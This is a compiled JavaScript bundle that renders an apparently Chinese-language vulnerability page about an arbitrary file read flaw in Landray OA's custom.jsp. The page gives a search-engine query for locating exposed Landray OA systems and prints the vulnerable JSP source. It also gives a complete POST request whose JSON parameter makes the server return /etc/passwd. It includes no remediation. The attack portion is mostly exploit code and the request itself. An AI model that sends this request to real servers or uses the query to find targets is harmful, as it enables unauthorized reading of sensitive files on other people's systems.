(window.webpackJsonp=window.webpackJsonp||[]).push([[433],{1564:function(a,s,t){a.exports=t.p+"assets/img/lanling-2.850c259e.png"},2545:function(a,s,t){"use strict";t.r(s);var e=t(75),n=Object(e.a)({},(function(){var a=this,s=a.$createElement,e=a._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h1",{attrs:{id:"蓝凌oa-custom-jsp-任意文件读取漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#蓝凌oa-custom-jsp-任意文件读取漏洞"}},[a._v("#")]),a._v(" 蓝凌OA custom.jsp 任意文件读取漏洞")]),a._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),e("p",[a._v("深圳市蓝凌软件股份有限公司数字OA(EKP)存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息。")]),a._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[a._v("#")]),a._v(" 漏洞影响")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[a._v("蓝凌OA")]),e("br"),a._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[a._v("#")]),a._v(" 网络测绘")]),a._v(" "),e("a-checkbox",{attrs:{checked:""}},[a._v('app="Landray-OA系统"')]),e("br"),a._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),e("p",[a._v("出现漏洞的文件为 custom.jsp")]),a._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[a._v('<%@page import="com.landray.kmss.util.ResourceUtil"%>\n<%@page import="net.sf.json.JSONArray"%>\n<%@page import="net.sf.json.JSONObject"%>\n<%@ page language="java" pageEncoding="UTF-8"%>\n<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>\n<%\n JSONObject vara =\nJSONObject.fromObject(request.getParameter("var"));\n JSONObject body = JSONObject.fromObject(vara.get("body"));\n%>\n<c:import url=\'<%=body.getString("file") %>\'>\n <c:param name="var" value="${ param[\'var\'] }"></c:param>\n</c:import>\n')])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br"),e("span",{staticClass:"line-number"},[a._v("2")]),e("br"),e("span",{staticClass:"line-number"},[a._v("3")]),e("br"),e("span",{staticClass:"line-number"},[a._v("4")]),e("br"),e("span",{staticClass:"line-number"},[a._v("5")]),e("br"),e("span",{staticClass:"line-number"},[a._v("6")]),e("br"),e("span",{staticClass:"line-number"},[a._v("7")]),e("br"),e("span",{staticClass:"line-number"},[a._v("8")]),e("br"),e("span",{staticClass:"line-number"},[a._v("9")]),e("br"),e("span",{staticClass:"line-number"},[a._v("10")]),e("br"),e("span",{staticClass:"line-number"},[a._v("11")]),e("br"),e("span",{staticClass:"line-number"},[a._v("12")]),e("br"),e("span",{staticClass:"line-number"},[a._v("13")]),e("br")])]),e("p",[a._v("请求包为")]),a._v(" "),e("div",{staticClass:"language-plain line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-plain"}},[e("code",[a._v('POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1\nHost:\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\nContent-Length: 42\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\nvar={"body":{"file":"file:///etc/passwd"}}\n')])]),a._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[a._v("1")]),e("br"),e("span",{staticClass:"line-number"},[a._v("2")]),e("br"),e("span",{staticClass:"line-number"},[a._v("3")]),e("br"),e("span",{staticClass:"line-number"},[a._v("4")]),e("br"),e("span",{staticClass:"line-number"},[a._v("5")]),e("br"),e("span",{staticClass:"line-number"},[a._v("6")]),e("br"),e("span",{staticClass:"line-number"},[a._v("7")]),e("br"),e("span",{staticClass:"line-number"},[a._v("8")]),e("br")])]),e("p",[e("img",{attrs:{src:t(1564),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=n.exports}}]);